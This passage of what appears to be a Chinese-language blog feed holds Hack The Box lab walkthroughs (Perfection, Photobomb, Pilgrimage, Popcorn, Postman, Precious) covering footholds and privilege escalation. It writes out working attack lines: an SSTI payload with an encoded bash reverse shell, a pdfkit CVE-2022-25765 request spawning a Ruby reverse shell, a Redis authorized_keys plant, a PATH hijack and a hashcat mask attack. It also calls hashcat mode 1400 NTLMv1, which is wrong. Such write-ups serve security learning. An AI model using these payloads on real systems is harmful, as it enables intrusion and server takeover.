+&lt;/h1&gt;&lt;p&gt;拿到网站扫描端口，在浏览器打开发现底部有提示&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;WEBrick1.7.0，寻找该版本漏洞未果后发现是ruby语言（&lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;Wappalyzer扩展收集信息&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;）&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;了解到ruby语言与python语言用高级语言搭建的服务器通常有模板，衍生想到模板注入SSTI&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;在全网站为一有参数的地方试出playpoad=a%0A&amp;lt;%25+命令+%25&amp;gt;&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;反弹shell，试了原装playload不行，要base64转码而且要拼接（不太懂为什么）&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;最后playload为&lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;a%0A&amp;lt;%25%3dsystem(&amp;ldquo;echo+IyEvYmluL2Jhc2gKYmFzaCAtaSA=PiYgL2Rldi90Y3AvMTAuMTAuMTYuMjkvMTMzNyAwPiYx|+base64+-d+|+bash&amp;rdquo;);+%25&amp;gt;&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;+代替空格防止被url转码&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/perfection/1723209744030-be2d173f-f4f7-4874-91da-9425f41b13c2.png&#34;
+	width=&#34;521&#34;
+	height=&#34;496&#34;
+	srcset=&#34;https://example.com/htb/perfection/1723209744030-be2d173f-f4f7-4874-91da-9425f41b13c2_hu33491c49e7ad506b67a5a3292197f704_91346_480x0_resize_box_3.png 480w, https://example.com/htb/perfection/1723209744030-be2d173f-f4f7-4874-91da-9425f41b13c2_hu33491c49e7ad506b67a5a3292197f704_91346_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;105&#34;
+		data-flex-basis=&#34;252px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;最后拿到shell&lt;/p&gt;
+&lt;h1 id=&#34;提权&#34;&gt;提权
+&lt;/h1&gt;&lt;p&gt;开始提权&lt;/p&gt;
+&lt;p&gt;被科普了一种提权文件linpeas.sh，枚举系统可能提权的文件信息然后标注给我们&lt;/p&gt;
+&lt;p&gt;这台靶机不行，看wp了解到有提示创始人susan用户密码的格式&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/perfection/1723210032558-34e675c1-ff8f-4dce-af61-c6cc656a5913.png&#34;
+	width=&#34;1162&#34;
+	height=&#34;303&#34;
+	srcset=&#34;https://example.com/htb/perfection/1723210032558-34e675c1-ff8f-4dce-af61-c6cc656a5913_hu22f23fcb8573683e864eb5bb7afdceac_148645_480x0_resize_box_3.png 480w, https://example.com/htb/perfection/1723210032558-34e675c1-ff8f-4dce-af61-c6cc656a5913_hu22f23fcb8573683e864eb5bb7afdceac_148645_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;383&#34;
+		data-flex-basis=&#34;920px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;大概意思就是需要用户自己重置密码，重置的格式为{名字_名字的逆序_在(1,1000000000)之间的一个随机数}，尝试使用hashcat的掩码爆破功能破解&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;hashcat -m 1400 -a 3 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f susan_nasus_?d?d?d?d?d?d?d?d?d&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;hashcat -m 1400：你使用 hashcat 工具来破解一个密码散列。-m 1400 选项指定了散列类型，是一个 NTLMv1 散列。&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;-a 3：你使用的是第 3 类攻击模式，这是字典和递增攻击的结合。&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;abe&amp;hellip;：这是你想要破解的密码散列。&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;susan_nasus_?d?d?d?d?d?d?d?d?d：这是你的密码候选项。? 字符表示未知字符，在破解过程中将被替换为实际字符（1-1000000000为9位数字）&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;破解出密码&lt;/font&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;susan_nasus_413759210&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(77, 77, 77);&#34;&gt;使用ssh&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/perfection/1723210345145-0565b541-4720-4b2f-9d76-e446a4b99dc3.png&#34;
+	width=&#34;639&#34;
+	height=&#34;451&#34;
+	srcset=&#34;https://example.com/htb/perfection/1723210345145-0565b541-4720-4b2f-9d76-e446a4b99dc3_hu9bda3fab542550c8e34d0aa1ae81121d_96339_480x0_resize_box_3.png 480w, https://example.com/htb/perfection/1723210345145-0565b541-4720-4b2f-9d76-e446a4b99dc3_hu9bda3fab542550c8e34d0aa1ae81121d_96339_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;141&#34;
+		data-flex-basis=&#34;340px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;sudo su root提权&lt;/p&gt;
+&lt;p&gt;靶机完成&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Photobomb</title>
+        <link>https://example.com/htb/photobomb/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/photobomb/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h1&gt;&lt;p&gt;扫端口正常，有域名爆子域名无发现，目录扫描没发现&lt;/p&gt;
+&lt;p&gt;打开网页看到一个路径/print&lt;/p&gt;
+&lt;p&gt;要验证，是Basic验证，准备爆破密码，但是在源码上看到一个js文件，点进去看见一个&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/photobomb/1727163063476-8212047c-651d-4265-9677-063ffac2c3ba.png&#34;
+	width=&#34;948&#34;
+	height=&#34;212&#34;
+	srcset=&#34;https://example.com/htb/photobomb/1727163063476-8212047c-651d-4265-9677-063ffac2c3ba_hu8f3a00fcb45f9b336818490b4790f40e_35595_480x0_resize_box_3.png 480w, https://example.com/htb/photobomb/1727163063476-8212047c-651d-4265-9677-063ffac2c3ba_hu8f3a00fcb45f9b336818490b4790f40e_35595_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;447&#34;
+		data-flex-basis=&#34;1073px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;有账号密码点进去，里面有一个下载图片的功能，Burp拦截测试一下&lt;/p&gt;
+&lt;p&gt;有三个注入点，逐一测试一下&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/photobomb/1727163180944-81828269-2e25-4c0c-9ded-5d6bb9a57029.png&#34;
+	width=&#34;654&#34;
+	height=&#34;404&#34;
+	srcset=&#34;https://example.com/htb/photobomb/1727163180944-81828269-2e25-4c0c-9ded-5d6bb9a57029_hubbfac203f54ba84af1fa038b9ef6eb40_37115_480x0_resize_box_3.png 480w, https://example.com/htb/photobomb/1727163180944-81828269-2e25-4c0c-9ded-5d6bb9a57029_hubbfac203f54ba84af1fa038b9ef6eb40_37115_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;161&#34;
+		data-flex-basis=&#34;388px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;在filetype上存在注入点，curl配合反弹shell。拿到shell&lt;/p&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;p&gt;sudo -l 查看root文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/photobomb/1727163320809-0758f515-8550-48c7-998e-a6a87a9a5841.png&#34;
+	width=&#34;737&#34;
+	height=&#34;289&#34;
+	srcset=&#34;https://example.com/htb/photobomb/1727163320809-0758f515-8550-48c7-998e-a6a87a9a5841_hu7d3140e61ed232a283b92c04c3cb5eea_50564_480x0_resize_box_3.png 480w, https://example.com/htb/photobomb/1727163320809-0758f515-8550-48c7-998e-a6a87a9a5841_hu7d3140e61ed232a283b92c04c3cb5eea_50564_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;255&#34;
+		data-flex-basis=&#34;612px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;在最后一行运用了find命令，但是是相对路径，本来是运用/usr/bin/find的，&lt;/p&gt;
+&lt;p&gt;但是我们可以伪造一个find bash文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/photobomb/1727163440449-2d46d242-59c5-4e37-917e-d88d053aff1b.png&#34;
+	width=&#34;792&#34;
+	height=&#34;265&#34;
+	srcset=&#34;https://example.com/htb/photobomb/1727163440449-2d46d242-59c5-4e37-917e-d88d053aff1b_hu67356612b08689cb6e7cc6140ffc5383_50324_480x0_resize_box_3.png 480w, https://example.com/htb/photobomb/1727163440449-2d46d242-59c5-4e37-917e-d88d053aff1b_hu67356612b08689cb6e7cc6140ffc5383_50324_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;298&#34;
+		data-flex-basis=&#34;717px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;然后&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo PATH=$PWD:$PATH /opt/cleanup.sh
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://example.com/htb/photobomb/1727163479434-81b77f1f-4a9e-4cab-865e-07fc80364a77.png&#34;
+	width=&#34;945&#34;
+	height=&#34;680&#34;
+	srcset=&#34;https://example.com/htb/photobomb/1727163479434-81b77f1f-4a9e-4cab-865e-07fc80364a77_hud56ab22ef60499cac6af4d03dc496087_126659_480x0_resize_box_3.png 480w, https://example.com/htb/photobomb/1727163479434-81b77f1f-4a9e-4cab-865e-07fc80364a77_hud56ab22ef60499cac6af4d03dc496087_126659_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;138&#34;
+		data-flex-basis=&#34;333px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;将当前存在我们伪造的find文件的文件夹作为优先环境变量，这样cleanup.sh文件最后一行就会优先执行我们的find文件而不是/usr/bin/find文件，从而以root权限执行了bash&lt;/p&gt;
+&lt;p&gt;拿到了root&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/photobomb/1727163589935-fb9c63ac-ddf4-4724-8c00-00516f26df92.png&#34;
+	width=&#34;582&#34;
+	height=&#34;222&#34;
+	srcset=&#34;https://example.com/htb/photobomb/1727163589935-fb9c63ac-ddf4-4724-8c00-00516f26df92_hu3e99db0d8e06a13f75612bfad0c469fa_19210_480x0_resize_box_3.png 480w, https://example.com/htb/photobomb/1727163589935-fb9c63ac-ddf4-4724-8c00-00516f26df92_hu3e99db0d8e06a13f75612bfad0c469fa_19210_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;262&#34;
+		data-flex-basis=&#34;629px&#34;
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Pilgrimage</title>
+        <link>https://example.com/htb/pilgrimage/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/pilgrimage/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h1&gt;&lt;p&gt;拿到ip扫端口，网页打开有域名扫子域名，然后目录爆破没有发现&lt;/p&gt;
+&lt;p&gt;nmap扫到80端口有/.git库但是我们网页打不开，借用工具git-dumper&lt;/p&gt;
+&lt;p&gt;下载下来查看到源码&lt;/p&gt;
+&lt;p&gt;python git-dumper -url git&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/pilgrimage/1728200721868-1d723440-d7be-4ffd-87eb-6bf7a5e2fca3.png&#34;
+	width=&#34;823&#34;
+	height=&#34;320&#34;
+	srcset=&#34;https://example.com/htb/pilgrimage/1728200721868-1d723440-d7be-4ffd-87eb-6bf7a5e2fca3_hu1f7196d33c67c5bfece680596862c4fc_82953_480x0_resize_box_3.png 480w, https://example.com/htb/pilgrimage/1728200721868-1d723440-d7be-4ffd-87eb-6bf7a5e2fca3_hu1f7196d33c67c5bfece680596862c4fc_82953_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;257&#34;
+		data-flex-basis=&#34;617px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/pilgrimage/1728200735962-6caa7e0d-1616-4407-9c80-8762a4bf9919.png&#34;
+	width=&#34;841&#34;
+	height=&#34;718&#34;
+	srcset=&#34;https://example.com/htb/pilgrimage/1728200735962-6caa7e0d-1616-4407-9c80-8762a4bf9919_hu49511ecce7b42f95c90670fd6e26ec95_110908_480x0_resize_box_3.png 480w, https://example.com/htb/pilgrimage/1728200735962-6caa7e0d-1616-4407-9c80-8762a4bf9919_hu49511ecce7b42f95c90670fd6e26ec95_110908_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;117&#34;
+		data-flex-basis=&#34;281px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;读这个数据库拿到emily用户的密码，ssh登录&lt;/p&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;p&gt;sudo -l无法现，几个常用的提权脚本也没用&lt;/p&gt;
+&lt;p&gt;ps aux查看系统进程&lt;/p&gt;
+&lt;p&gt;发现一个root运行的脚本&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/pilgrimage/1728200973386-f79a062d-fcb3-4d86-8e70-b2bc74e184dd.png&#34;
+	width=&#34;747&#34;
+	height=&#34;632&#34;
+	srcset=&#34;https://example.com/htb/pilgrimage/1728200973386-f79a062d-fcb3-4d86-8e70-b2bc74e184dd_hue9bac855cad243a17f8c8010cce50c1e_104450_480x0_resize_box_3.png 480w, https://example.com/htb/pilgrimage/1728200973386-f79a062d-fcb3-4d86-8e70-b2bc74e184dd_hue9bac855cad243a17f8c8010cce50c1e_104450_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;118&#34;
+		data-flex-basis=&#34;283px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;漏洞在Binwalk上&lt;/p&gt;
+&lt;p&gt;该系统的Binwalk版本是2.3.2的&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/pilgrimage/1728201017485-c15de499-15e0-4c5b-8594-67baaba2fcbd.png&#34;
+	width=&#34;787&#34;
+	height=&#34;716&#34;
+	srcset=&#34;https://example.com/htb/pilgrimage/1728201017485-c15de499-15e0-4c5b-8594-67baaba2fcbd_hu10b5f735a80a293400adbda99a7bd6f1_204722_480x0_resize_box_3.png 480w, https://example.com/htb/pilgrimage/1728201017485-c15de499-15e0-4c5b-8594-67baaba2fcbd_hu10b5f735a80a293400adbda99a7bd6f1_204722_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;109&#34;
+		data-flex-basis=&#34;263px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://example.com/htb/pilgrimage/1728201941163-87247da5-06e8-49d1-9e88-45bdd21ea0cf.png&#34;
+	width=&#34;776&#34;
+	height=&#34;203&#34;
+	srcset=&#34;https://example.com/htb/pilgrimage/1728201941163-87247da5-06e8-49d1-9e88-45bdd21ea0cf_hu28867e3cce0a70caf046aa94b95c73ed_88167_480x0_resize_box_3.png 480w, https://example.com/htb/pilgrimage/1728201941163-87247da5-06e8-49d1-9e88-45bdd21ea0cf_hu28867e3cce0a70caf046aa94b95c73ed_88167_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;382&#34;
+		data-flex-basis=&#34;917px&#34;
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Popcorn</title>
+        <link>https://example.com/htb/popcorn/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/popcorn/</guid>
+        <description>&lt;p&gt;有域名但扫不到子域名，目录爆出来个&lt;a class=&#34;link&#34; href=&#34;http://10.10.10.6/torrent/torrents.php?mode=upload&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;torrent&lt;/a&gt;目录&lt;/p&gt;
+&lt;p&gt;这个网站可以上传一个正确的bt种子，然后可以编辑种子的‘头像’&lt;/p&gt;
+&lt;p&gt;将文件类型改为image/png&lt;/p&gt;
+&lt;p&gt;然后就能上传phpshell文件&lt;/p&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;p&gt;linpeas扫到适用dirtycow&lt;/p&gt;
+&lt;p&gt;然后也有gcc环境&lt;/p&gt;
+&lt;p&gt;直接上Poc&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Postman</title>
+        <link>https://example.com/htb/postman/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/postman/</guid>
+        <description>&lt;p&gt;寻找立足点&lt;/p&gt;
+&lt;p&gt;扫描端有俩个不正常的&lt;/p&gt;
+&lt;p&gt;10000,6379&lt;/p&gt;
+&lt;p&gt;先看10000是个https网页，是一个cms登录，常用的密码无效，查看6379端口&lt;/p&gt;
+&lt;p&gt;得知6379端口是redis&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;background-color:rgb(249, 249, 249);&#34;&gt;redis-cli -h &lt;IP&gt; 尝试登录，成功了&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;background-color:rgb(249, 249, 249);&#34;&gt;了解到可以&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt; Redis 使用 root 账户运行（甚至不使用），攻击者可以将 SSH 公钥文件写入 root 账户，直接通过 SSH 登录受害者服务器。这可能允许黑客获得服务器权限、删除或窃取数据，甚至导致加密勒索，从而严重危害正常的业务服务。&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;首先在redis上创建一个.ssh文件夹&lt;/font&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;config get dir
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;config set dir /var/lib/redis/.ssh
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://example.com/htb/postman/1726984722680-e637ef7d-c532-4cda-9859-80ccc186ae7d.png&#34;
+	width=&#34;885&#34;
+	height=&#34;374&#34;
+	srcset=&#34;https://example.com/htb/postman/1726984722680-e637ef7d-c532-4cda-9859-80ccc186ae7d_hu7d9fef1885db1542020d2634306fe61a_127328_480x0_resize_box_3.png 480w, https://example.com/htb/postman/1726984722680-e637ef7d-c532-4cda-9859-80ccc186ae7d_hu7d9fef1885db1542020d2634306fe61a_127328_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;236&#34;
+		data-flex-basis=&#34;567px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;在我们kali上创建一个rsa（伪造ssh认证）&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;注意要这样&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(242, 242, 242);&#34;&gt;(echo -e &amp;ldquo;\n\n&amp;rdquo;; cat &lt;/font&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(242, 242, 242);&#34;&gt;id_rsa.pub&lt;/font&gt;&lt;/strong&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(242, 242, 242);&#34;&gt;; echo -e &amp;ldquo;\n\n&amp;rdquo;) &amp;gt; temp.txt&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;\n\n为了将一些乱码隔行防止它们阻碍我们的代码&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;然后将temp.txt传到redis中&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(92, 38, 153);background-color:rgb(249, 249, 249);&#34;&gt;cat&lt;/font&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(249, 249, 249);&#34;&gt; temp.txt | redis-cli -h &lt;IP&gt; -x &lt;/font&gt;&lt;font style=&#34;color:rgb(92, 38, 153);background-color:rgb(249, 249, 249);&#34;&gt;set&lt;/font&gt;&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(249, 249, 249);&#34;&gt; crackit&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;config set dbfilename &amp;ldquo;authorized_keys&amp;quot;将内容保存到authorized_keys中&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;然后save 保存&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;然后ssh连接成功&lt;/p&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;p&gt;浏览到/opt文件夹中含有用户Matt的ssh备份文件&lt;/p&gt;
+&lt;p&gt;下载下来破解密钥&lt;/p&gt;
+&lt;p&gt;得到密钥computer2008&lt;/p&gt;
+&lt;p&gt;ssh连接关闭，尝试从redis su升级一下&lt;/p&gt;
+&lt;p&gt;成功&lt;/p&gt;
+&lt;p&gt;sudo -l 无发现&lt;/p&gt;
+&lt;p&gt;注意到刚刚那个10000端口的网页用得到的用户密码去登录&lt;/p&gt;
+&lt;p&gt;成功&lt;/p&gt;
+&lt;p&gt;看到cms版本的webmin 1.910&lt;/p&gt;
+&lt;p&gt;msf存在可利用poc&lt;/p&gt;
+&lt;p&gt;设置参数成功拿到root&lt;/p&gt;
+&lt;p&gt;注意将ssl设置为true&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(34, 170, 221);&#34;&gt;&lt;/font&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Precious</title>
+        <link>https://example.com/htb/precious/</link>
+        <pubDate>Wed, 19 Mar 2025 14:40:00 +0800</pubDate>
+        
+        <guid>https://example.com/htb/precious/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h1&gt;&lt;p&gt;扫描端口无发现，打开网站使用插件得知该网站使用的是&lt;strong&gt;Phusion Passenger&lt;/strong&gt;（网络服务器）&lt;/p&gt;
+&lt;p&gt;经探测输入一个可访问的网站会提供给我一个快照，下载该图片分析&lt;/p&gt;
+&lt;p&gt;使用&lt;font style=&#34;color:rgb(36, 36, 36);background-color:rgb(242, 242, 242);&#34;&gt;exiftool&lt;/font&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;工具进行分析&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(36, 36, 36);&#34;&gt;得知信息&lt;/font&gt;&lt;img src=&#34;https://example.com/htb/precious/1725247273002-439a3a14-c9cb-45e6-bdb7-aa74f340ef02.png&#34;
+	width=&#34;1836&#34;
+	height=&#34;1002&#34;
+	srcset=&#34;https://example.com/htb/precious/1725247273002-439a3a14-c9cb-45e6-bdb7-aa74f340ef02_hu852a937e292635bd97b618bb5ac924ee_346092_480x0_resize_box_3.png 480w, https://example.com/htb/precious/1725247273002-439a3a14-c9cb-45e6-bdb7-aa74f340ef02_hu852a937e292635bd97b618bb5ac924ee_346092_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;183&#34;
+		data-flex-basis=&#34;439px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;pdfkit v0.8.6版本创建，搜索发现有个CVE-2022-25765&lt;/p&gt;
+&lt;p&gt;curl &amp;lsquo;TARGET_ADDRESS&amp;rsquo; -X POST -H &amp;lsquo;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&amp;rsquo; -H &amp;lsquo;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8&amp;rsquo; -H &amp;lsquo;Accept-Language: en-US,en;q=0.5&amp;rsquo; -H &amp;lsquo;Accept-Encoding: gzip, deflate&amp;rsquo; -H &amp;lsquo;Content-Type: application/x-www-form-urlencoded&amp;rsquo; -H &amp;lsquo;Origin: TARGET_ADDRESS&amp;rsquo; -H &amp;lsquo;Connection: keep-alive&amp;rsquo; -H &amp;lsquo;Referer: TARGET_ADDRESS&amp;rsquo; -H &amp;lsquo;Upgrade-Insecure-Requests: 1&amp;rsquo; &amp;ndash;data-raw &amp;lsquo;url=http%3A%2F%2FLOCAL-ADDRESS%3ALOCAL-PORT%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22LOCAL-ADDRESS%22%2CLOCAL-PORT%29%29%27%60&amp;rsquo;&lt;/p&gt;
+&lt;p&gt;进入拿到ruby身份&lt;/p&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;h2 id=&#34;ruby-henry&#34;&gt;ruby-&amp;gt;henry
